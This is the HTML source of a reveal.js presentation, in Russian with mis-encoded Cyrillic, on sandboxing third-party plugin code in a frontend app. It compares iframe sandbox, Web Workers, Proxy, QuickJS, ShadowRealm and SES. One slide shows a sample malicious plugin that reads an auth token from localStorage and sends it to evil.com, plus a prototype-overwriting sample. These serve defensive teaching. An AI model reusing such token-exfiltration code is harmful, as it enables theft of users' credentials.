<!doctype html>
<html lang="en">

<head>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,100..900;1,100..900&family=Manrope:wght@200..800&display=swap"
    rel="stylesheet">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>reveal.js</title>

  <link rel="stylesheet" href="dist/reset.css">
  <link rel="stylesheet" href="dist/reveal.css">
  <link rel="stylesheet" href="dist/theme/white.css">


  <!-- Theme used for syntax highlighted code -->
  <link rel="stylesheet" href="plugin/highlight/monokai.css">
</head>

<body>
    <div class="reveal">
        <div class="slides">
            
            <!-- –¢–∏—Ç—É–ª—å–Ω—ã–π —Å–ª–∞–π–¥ -->
            <section>
                <h1 class="r-fit-text">–ù–µ –±—Ä–∞—É–∑–µ—Ä–Ω—ã–µ, –∞ —Å–≤–æ–∏</h1>
                <p>–ø–∏—à–µ–º —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é –ø–ª–∞–≥–∏–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É –¥–ª—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</p>
            </section>

            <!-- –í–≤–æ–¥–Ω–∞—è —á–∞—Å—Ç—å -->
            <section>
                <section>
                    <h2>–ó–∞—á–µ–º –Ω—É–∂–Ω—ã –ø–ª–∞–≥–∏–Ω—ã?</h2>
                    <ul>
                        <li>–ö–∞–∂–¥—ã–π –¥–µ–ª–∞–µ—Ç —Å–≤–æ—é –∑–∞–¥–∞—á—É</li>
                        <li>–ù–µ –º–µ—à–∞—é—Ç –¥—Ä—É–≥ –¥—Ä—É–≥—É</li>
                        <li>–†–∞—Å—à–∏—Ä—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å</li>
                    </ul>
                </section>
               <section>
                <h2>–ï—Å—Ç—å —á–∏—Å–ª–æ</h2>
                <img src="img/p1.png" alt="">
               </section>
               <section>
                <h2>–ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω–æ–µ –º–µ–Ω—é</h2>
                <img src="img/p2.png" alt="">
               </section>
               <section>
                <h2>–ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç</h2>
                <img src="img/p3.png" alt="">
               </section>
                <section>
                    <h3>–ì–ª–∞–≤–Ω—ã–π –≤–æ–ø—Ä–æ—Å</h3>
                    <h2 style="color: #e74c3c;">–ö–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å —á—É–∂–æ–π –∫–æ–¥ –±–µ–∑–æ–ø–∞—Å–Ω–æ?</h2>
                </section>
            </section>
               <section style="text-align: left;">
                    <h2 style="text-align: center;">–í—ã–±–æ—Ä —è–∑—ã–∫–∞</h2>
                    <p>&mdash; –ö–∞–∫–æ–π —è–∑—ã–∫?</p>
                    <p>&mdash; –ö–æ–Ω–µ—á–Ω–æ JavaScript!</p>
               </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞: –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥</h3>
                    <pre><code class="javascript" data-trim>
// –ü–ª–∞–≥–∏–Ω –∫—Ä–∞–¥—ë—Ç —Ç–æ–∫–µ–Ω—ã
const token = localStorage.getItem('auth_token');
fetch('https://evil.com/steal?token=' + token);

// –ò–ª–∏ –ª–æ–º–∞–µ—Ç –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã
Array.prototype.push = function() {
  console.log('–•–∞–∫–Ω—É—Ç–æ! üòà');
};
                    </code></pre>
                </section>

            <section>
              <h2>–ú–µ—Ç–æ–¥—ã –∏–∑–æ–ª—è—Ü–∏–∏</h2>
              <ul>
                <li class="fragment">iframe —Å –∞—Ç—Ä–∏–±—É—Ç–æ–º sandbox</li>
                <li class="fragment">Web Workers</li>
                <li class="fragment">SES (Hardened JavaScript)</li>
                <li class="fragment">Shadow Realms (Realm API)</li>
                <li class="fragment">Proxy-based –∏–∑–æ–ª—è—Ü–∏—è</li>
                <li class="fragment">QuickJS + WebAssembly</li>
              </ul>
            </section>




<!-- iframe -->
<section>
  <section>
    <h2>iframe —Å sandbox</h2>
    <p>–ò–∑–æ–ª—è—Ü–∏—è –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –±—Ä–∞—É–∑–µ—Ä–∞</p>
    <pre><code data-trim data-noescape class="html">
&lt;iframe sandbox="allow-scripts"
        src="plugin.html"&gt;
&lt;/iframe&gt;
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã iframe</h3>
    <ul>
      <li class="fragment">–°–∏–ª—å–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è DOM –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</li>
      <li class="fragment">–ì—Ä–∞–Ω—É–ª—è—Ä–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π</li>
      <li class="fragment">–ü–æ–¥–¥–µ—Ä–∂–∫–∞ –≤—Å–µ–º–∏ –±—Ä–∞—É–∑–µ—Ä–∞–º–∏</li>
      <li class="fragment">–°–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —á–µ—Ä–µ–∑ contentWindow</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã iframe</h3>
    <ul>
      <li class="fragment">–ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –∑–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</li>
      <li class="fragment">–ù–∞–∫–ª–∞–¥–Ω—ã–µ —Ä–∞—Å—Ö–æ–¥—ã –Ω–∞ —Å–æ–∑–¥–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞</li>
      <li class="fragment">–ü—Ä–æ–±–ª–µ–º—ã —Å OOPIF</li>
      <li class="fragment">allow-scripts + allow-same-origin = —Ä–∏—Å–∫</li>
    </ul>
  </section>
  <section>
    <p>OOPIF ‚Äî —ç—Ç–æ –∫–æ–≥–¥–∞ –±—Ä–∞—É–∑–µ—Ä –∑–∞–ø—É—Å–∫–∞–µ—Ç iframe –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –∞ –Ω–µ –≤ —Ç–æ–º –∂–µ –ø—Ä–æ—Ü–µ—Å—Å–µ, —á—Ç–æ –∏ –æ—Å–Ω–æ–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</p>
  </section>
  <section>
    <h2>–î–æ OOPIF</h2>
    <pre><code data-trim>
// –°–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –≤—ã–∑–æ–≤
iframe.contentWindow.runPlugin();
const result = iframe.contentWindow.getData(); // –°—Ä–∞–∑—É –ø–æ–ª—É—á–∞–µ–º
    </code></pre>
    <h2>–ü–æ—Å–ª–µ OOPIF</h2>
    <pre><code data-trim>
// –¢–µ–ø–µ—Ä—å —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–∞–∫ Web Worker
iframe.contentWindow.postMessage('runPlugin');

// –ñ–¥—ë–º –æ—Ç–≤–µ—Ç–∞ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ
window.addEventListener('message', (e) => {
  const result = e.data; // –ü–æ–ª—É—á–∞–µ–º –ø–æ–∑–∂–µ
});
    </code></pre>
  </section>
  <section>
    <h2>–†–æ–ª—å allow-scripts –∏ allow-same-origin</h2>
    <ul style="font-size: 0.8em;">
      <li><strong>allow-scripts</strong> —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ JavaScript –≤–Ω—É—Ç—Ä–∏ iframe</li>
      <li><strong>allow-same-origin</strong> –ø–æ–∑–≤–æ–ª—è–µ—Ç iframe –∏–º–µ—Ç—å —Ç–æ –∂–µ –ø—Ä–æ–∏—Å—Ö–æ–∂–¥–µ–Ω–∏–µ, —á—Ç–æ –∏ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</li>
    </ul>
  </section>
  <section>
    <h2>–ü–æ—á–µ–º—É –≤–º–µ—Å—Ç–µ —ç—Ç–æ –æ–ø–∞—Å–Ω–æ?</h2>
    <p>–°–æ–≤–º–µ—Å—Ç–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–∏—Ö –∞—Ç—Ä–∏–±—É—Ç–æ–≤ —Å–Ω–∏–º–∞–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è sandbox –∏ –¥–∞—ë—Ç iframe –¥–æ—Å—Ç—É–ø –∫ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–º cookies –∏ DOM.</p>
  </section>
</section>

<!-- Web Workers -->
<section>
  <section>
    <h2>Web Workers</h2>
    <p>–ò–∑–æ–ª—è—Ü–∏—è –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ</p>
    <pre><code data-trim data-noescape class="javascript">
const worker = new Worker('plugin.js');

worker.postMessage({ action: 'run' });

worker.onmessage = (e) => {
  console.log('Result:', e.data);
};
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã Web Workers</h3>
    <ul>
      <li class="fragment">–ü–æ–ª–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è –ø–æ—Ç–æ–∫–∞ ‚Äî –Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç UI</li>
      <li class="fragment">–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ DOM –∏ window</li>
      <li class="fragment">–ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –Ω–µ –∑–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</li>
      <li class="fragment">–û—Ç–ª–∏—á–Ω–∞—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏–π</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã Web Workers</h3>
    <ul>
      <li class="fragment">–¢–æ–ª—å–∫–æ postMessage ‚Äî –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π API</li>
      <li class="fragment">–°–ª–æ–∂–Ω–æ—Å—Ç—å —Å–æ–∑–¥–∞–Ω–∏—è —É–¥–æ–±–Ω–æ–≥–æ API</li>
      <li class="fragment">–ü—Ä–æ–±–ª–µ–º—ã —Å –ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–µ–π</li>
      <li class="fragment">–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏—è</li>
      <li class="fragment">–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ DOM</li>
    </ul>
  </section>
</section>



<!-- Proxy -->
<section>
  <section>
    <h2>Proxy-based –∏–∑–æ–ª—è—Ü–∏—è</h2>
    <p>–ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø–∞ —á–µ—Ä–µ–∑ Proxy</p>
    <pre><code data-trim data-noescape class="javascript">
const sandbox = new Proxy(globalThis, {
  get(target, prop) {
    if (prop === 'document') return undefined;
    return target[prop];
  }
});

with (sandbox) {
  // plugin code
}
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã Proxy</h3>
    <ul>
      <li class="fragment">–õ—ë–≥–∫–æ–≤–µ—Å–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è</li>
      <li class="fragment">–ì–∏–±–∫–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø–∞</li>
      <li class="fragment">–°–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ</li>
      <li class="fragment">–í—ã–±–æ—Ä–æ—á–Ω–æ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ API</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã Proxy</h3>
    <ul>
      <li class="fragment">–°–ª–∞–±–∞—è –∏–∑–æ–ª—è—Ü–∏—è</li>
      <li class="fragment">–õ–µ–≥–∫–æ –æ–±–æ–π—Ç–∏ —á–µ—Ä–µ–∑ constructor.prototype</li>
      <li class="fragment">–ù–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç –≤—Å–µ—Ö –∞—Ç–∞–∫</li>
      <li class="fragment">–¢—Ä–µ–±—É–µ—Ç —Ç—â–∞—Ç–µ–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</li>
      <li class="fragment">–ù–µ –¥–ª—è –Ω–µ–¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞</li>
    </ul>
  </section>
</section>

<!-- QuickJS -->
<section>
  <section>
    <h2>QuickJS + WebAssembly</h2>
    <p>JS engine –≤ WASM</p>
    <pre><code data-trim data-noescape class="javascript">
import { getQuickJS } from 'quickjs-emscripten';

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode('1 + 1');
console.log(vm.dump(result)); // 2

result.dispose();
vm.dispose();
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã QuickJS</h3>
    <ul>
      <li class="fragment">–ù–∞—Å—Ç–æ—è—â–∞—è –ø–µ—Å–æ—á–Ω–∏—Ü–∞ –Ω–∞ —É—Ä–æ–≤–Ω–µ –¥–≤–∏–∂–∫–∞</li>
      <li class="fragment">–ü–æ–¥–¥–µ—Ä–∂–∫–∞ JavaScript –∏ TypeScript</li>
      <li class="fragment">–ö–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–µ API</li>
      <li class="fragment">–í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Ñ–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞</li>
      <li class="fragment">–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã QuickJS</h3>
    <ul>
      <li class="fragment">–ù–∞–∫–ª–∞–¥–Ω—ã–µ —Ä–∞—Å—Ö–æ–¥—ã WASM</li>
      <li class="fragment">–°–ª–æ–∂–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞ –æ–±—ä–µ–∫—Ç–æ–≤</li>
      <li class="fragment">Web API –Ω–µ –¥–æ—Å—Ç—É–ø–Ω—ã –∏–∑ –∫–æ—Ä–æ–±–∫–∏</li>
      <li class="fragment">–ù—É–∂–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–ª—è DOM</li>
      <li class="fragment">–£–≤–µ–ª–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –±–∞–Ω–¥–ª–∞</li>
    </ul>
  </section>
</section>

<!-- Shadow Realms -->
<section>
  <section>
    <h2>Shadow Realms</h2>
    <p>–ù–æ–≤—ã–π JavaScript realm (Stage 3 TC39)</p>
    <pre><code data-trim data-noescape class="javascript">
const realm = new ShadowRealm();

realm.evaluate('globalThis.x = 1');

const result = realm.evaluate('x + 1'); // 2
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã Shadow Realms</h3>
    <ul>
      <li class="fragment">–û—Ç–¥–µ–ª—å–Ω—ã–π –≥–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—ä–µ–∫—Ç –∏ intrinsics</li>
      <li class="fragment">–°–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ evaluate()</li>
      <li class="fragment">–ö–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–π –æ–±–º–µ–Ω –∑–Ω–∞—á–µ–Ω–∏—è–º–∏</li>
      <li class="fragment">–ú–µ–Ω—å—à–µ —Ä–µ—Å—É—Ä—Å–æ–≤ —á–µ–º Web Workers</li>
      <li class="fragment">–ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –∑–∞–≥—Ä—è–∑–Ω–µ–Ω–∏–µ –≥–ª–æ–±–∞–ª—å–Ω–æ–≥–æ scope</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã Shadow Realms</h3>
    <ul>
      <li class="fragment">Stage 3 proposal ‚Äî –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞</li>
      <li class="fragment">–ú–∞–ª–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏</li>
      <li class="fragment">–ù–µ –≤—Å–µ –±—Ä–∞—É–∑–µ—Ä—ã –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç</li>
      <li class="fragment">–í–æ–∑–º–æ–∂–Ω—ã –ø—Ä–æ–±–ª–µ–º—ã —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏</li>
    </ul>
  </section>
</section>

<!-- SES -->
<section>
  <section>
    <h2>SES (Secure EcmaScript)</h2>
    <p>Hardened JavaScript —Å –∑–∞–º–æ—Ä–æ–∂–µ–Ω–Ω—ã–º–∏ intrinsics</p>
    <pre style="font-size: 0.7em;"><code data-trim data-noescape class="javascript">
import 'ses';

lockdown();

const compartment = new Compartment({
  console
});

compartment.evaluate('console.log("Hello")');
    </code></pre>
  </section>
  
  <section>
    <h3>–ü–ª—é—Å—ã SES</h3>
    <ul>
      <li class="fragment">–ó–∞—â–∏—Ç–∞ –æ—Ç prototype pollution</li>
      <li class="fragment">Compartments —Å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–º globalThis</li>
      <li class="fragment">–°–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ</li>
      <li class="fragment">–¢–æ—á–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø–Ω—ã—Ö API</li>
    </ul>
  </section>
  
  <section>
    <h3>–ú–∏–Ω—É—Å—ã SES</h3>
    <ul>
      <li class="fragment">–ú–Ω–æ–≥–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞—é—Ç</li>
      <li class="fragment">–°–ª–æ–∂–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞</li>
      <li class="fragment">–¢—Ä–µ–±—É–µ—Ç –ø–æ–Ω–∏–º–∞–Ω–∏—è hardened JS</li>
      <li class="fragment">–û–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–∞—è —ç–∫–æ—Å–∏—Å—Ç–µ–º–∞ npm</li>
    </ul>
  </section>
</section>

<!-- –°—Ä–∞–≤–Ω–∏—Ç–µ–ª—å–Ω–∞—è —Ç–∞–±–ª–∏—Ü–∞ -->
<section>
  <h2>–í—ã–±–æ—Ä –º–µ—Ç–æ–¥–∞</h2>
  <table style="font-size: 0.7em;">
    <thead>
      <tr>
        <th>–ú–µ—Ç–æ–¥</th>
        <th>–ò–∑–æ–ª—è—Ü–∏—è</th>
        <th>–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</th>
        <th>–°–ª–æ–∂–Ω–æ—Å—Ç—å</th>
      </tr>
    </thead>
    <tbody>
      <tr class="fragment">
        <td>iframe</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–°—Ä–µ–¥–Ω—è—è</td>
        <td>–ù–∏–∑–∫–∞—è</td>
      </tr>
      <tr class="fragment">
        <td>Web Workers</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–°—Ä–µ–¥–Ω—è—è</td>
      </tr>
      <tr class="fragment">
        <td>SES</td>
        <td>–°—Ä–µ–¥–Ω—è—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
      </tr>
      <tr class="fragment">
        <td>Shadow Realms</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–ù–∏–∑–∫–∞—è</td>
      </tr>
      <tr class="fragment">
        <td>Proxy</td>
        <td>–ù–∏–∑–∫–∞—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
        <td>–°—Ä–µ–¥–Ω—è—è</td>
      </tr>
      <tr class="fragment">
        <td>QuickJS</td>
        <td>–û—á–µ–Ω—å –≤—ã—Å–æ–∫–∞—è</td>
        <td>–°—Ä–µ–¥–Ω—è—è</td>
        <td>–í—ã—Å–æ–∫–∞—è</td>
      </tr>
    </tbody>
  </table>
</section>

<!-- –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ -->
<section>
  <h2>–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏</h2>
  <ul style="font-size: 0.7em;">
    <li class="fragment"><strong>UI-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã</strong> ‚Üí iframe</li>
    <li class="fragment"><strong>–í—ã—á–∏—Å–ª–µ–Ω–∏—è</strong> ‚Üí Web Workers</li>
    <li class="fragment"><strong>–ë–∞–ª–∞–Ω—Å DX –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</strong> ‚Üí SES/Shadow Realms</li>
    <li class="fragment"><strong>–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è</strong> ‚Üí QuickJS</li>
    <li class="fragment"><strong>–ü—Ä–æ—Å—Ç—ã–µ —Å–ª—É—á–∞–∏</strong> ‚Üí Proxy (—Å –æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç—å—é)</li>
  </ul>
</section>
            <section>
                <section>
                    <h2>SES
      <br>
                    <small>Secure ECMAScript</small>
    </h2>
                    <p>–ò–∑–æ–ª—è—Ü–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è JavaScript</p>
                </section>

                <section>
                    <h3>–ß—Ç–æ —Ç–∞–∫–æ–µ SES?</h3>
                    <p><strong>&laquo;–ü–µ—Å–æ—á–Ω–∏—Ü–∞&raquo;</strong> –¥–ª—è JavaScript</p>
                    <br>
                    <p>üèñÔ∏è –ê–Ω–∞–ª–æ–≥–∏—è: –¥–µ—Ç—Å–∫–∞—è –ø–µ—Å–æ—á–Ω–∏—Ü–∞</p>
                    <ul>
                        <li>–†–µ–±—ë–Ω–æ–∫ –∏–≥—Ä–∞–µ—Ç –≤–Ω—É—Ç—Ä–∏</li>
                        <li>–ù–µ –º–æ–∂–µ—Ç –≤—ã–π—Ç–∏ –∑–∞ –≥—Ä–∞–Ω–∏—Ü—ã</li>
                        <li>–ù–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ—Ä—Ç–∏—Ç—å —Å–æ—Å–µ–¥–Ω—é—é –ø–ª–æ—â–∞–¥–∫—É</li>
                    </ul>
                </section>

                <section>
                    <h3>–ß—Ç–æ –¥–µ–ª–∞–µ—Ç SES</h3>
                    <ol>
                        <li>üîí –ó–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã</li>
                        <li>üö´ –£–±–∏—Ä–∞–µ—Ç –æ–ø–∞—Å–Ω—ã–µ –≥–ª–æ–±–∞–ª—å–Ω—ã–µ API</li>
                        <li>üì¶ –°–æ–∑–¥–∞—ë—Ç –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ "–∫–æ–º–ø–∞—Ä—Ç–º–µ–Ω—Ç—ã"</li>
                    </ol>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞ –±–µ–∑ SES</h3>
                    <pre><code class="javascript" data-trim>
// –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –ø–ª–∞–≥–∏–Ω –º–µ–Ω—è–µ—Ç Array.prototype
Array.prototype.push = function() { 
  console.log('–•–∞–∫–Ω—É—Ç–æ! üòà'); 
  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Ö–∞–∫–µ—Ä–∞
};

// –¢–µ–ø–µ—Ä—å –í–°–ï –º–∞—Å—Å–∏–≤—ã –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ —Å–ª–æ–º–∞–Ω—ã
const items = [];
items.push(1); // "–•–∞–∫–Ω—É—Ç–æ! üòà"
                    </code></pre>
                </section>

                <section>
                    <h3>–†–µ—à–µ–Ω–∏–µ —Å SES</h3>
                    <pre><code class="javascript" data-trim>
import 'ses';

// –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å –≤—Å–µ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã
lockdown();

// –°–æ–∑–¥–∞—Ç—å –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Ä–µ–¥—É
const compartment = new Compartment({
  console: console, // –Ø–≤–Ω–æ —Ä–∞–∑—Ä–µ—à–∞–µ–º
  // fetch –ù–ï –ø–µ—Ä–µ–¥–∞—ë–º - –ø–ª–∞–≥–∏–Ω –Ω–µ —Å–º–æ–∂–µ—Ç –¥–µ–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å—ã
});

// –ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–¥ –ø–ª–∞–≥–∏–Ω–∞
compartment.evaluate(pluginCode);
                    </code></pre>
                </section>

                <section>
                    <h3>–ü—Ä–∏–Ω—Ü–∏–ø –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π</h3>
                    <p>üîë <strong>–ê–Ω–∞–ª–æ–≥–∏—è:</strong> –ø—Ä–æ–ø—É—Å–∫ –≤ –æ—Ñ–∏—Å</p>
                    <br>
                    <ul>
                        <li>–û—Ç–∫—Ä—ã–≤–∞–µ—Ç —Ç–æ–ª—å–∫–æ –Ω—É–∂–Ω—ã–µ –¥–≤–µ—Ä–∏</li>
                        <li>–ù–µ –¥–∞—ë—Ç –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º—É –∑–¥–∞–Ω–∏—é</li>
                    </ul>
                    <br><br>
                    <p><em>–ü–ª–∞–≥–∏–Ω –ø–æ–ª—É—á–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Ç–æ, —á—Ç–æ —è–≤–Ω–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ</em></p>
                </section>

                <section>
                    <h3>–ß—Ç–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –≤ SES</h3>
                    <pre><code class="javascript" data-trim>
// –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –ø–ª–∞–≥–∏–Ω –ù–ï –º–æ–∂–µ—Ç:
fetch()           // ‚ùå –î–µ–ª–∞—Ç—å HTTP-–∑–∞–ø—Ä–æ—Å—ã
localStorage      // ‚ùå –ß–∏—Ç–∞—Ç—å —Ö—Ä–∞–Ω–∏–ª–∏—â–µ
document          // ‚ùå –ú–µ–Ω—è—Ç—å DOM
window.location   // ‚ùå –ò–∑–º–µ–Ω—è—Ç—å URL
XMLHttpRequest    // ‚ùå –°—Ç–∞—Ä—ã–µ –∑–∞–ø—Ä–æ—Å—ã
WebSocket         // ‚ùå –û—Ç–∫—Ä—ã–≤–∞—Ç—å —Å–æ–∫–µ—Ç—ã

// –ú–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ —Ç–æ, —á—Ç–æ –º—ã —è–≤–Ω–æ –ø–µ—Ä–µ–¥–∞–ª–∏ ‚úÖ
                    </code></pre>
                </section>
            </section>
            <section>
                <section>
                    <h2>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç SES –∏–∑–Ω—É—Ç—Ä–∏?</h2>
                    <h3>–ü–æ—à–∞–≥–æ–≤–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –Ω—É–ª—è</h3>
                </section>

                <section>
                    <h3>–¢—Ä–∏ –∫–∏—Ç–∞ SES</h3>
                    <div class="mermaid">
                        <pre>
%%{init: {'theme':'neutral'}}%%
graph TD
